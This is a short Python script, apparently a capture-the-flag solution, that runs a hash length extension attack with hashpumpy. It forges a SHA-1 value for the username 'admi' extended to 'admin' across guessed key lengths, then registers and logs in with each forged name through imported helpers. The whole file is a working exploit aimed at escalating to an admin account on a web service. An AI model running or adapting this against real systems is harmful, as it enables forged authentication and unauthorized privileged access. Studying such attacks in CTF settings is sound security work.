# hello
import hashpumpy
import urllib.parse

from functions import stick_register, stick_login

def main():
    # admi / '4dd28ad0560441245de6fda3973890eeb41b702d' / variable key length
    results = []
    for i in range(6, 30):
        data = hashpumpy.hashpump('4dd28ad0560441245de6fda3973890eeb41b702d', "admi", 'n', i)
        results.append(data)

    for r in results:
        register_user = urllib.parse.quote_from_bytes(r[1])
        print("{} => {}".format(r[0], register_user))

        register_email = f'stick_register@pwn.com'
        stick_register(register_user, register_email, register_user)

        stick_login(register_email, register_user)
        

if __name__ == "__main__":
    main()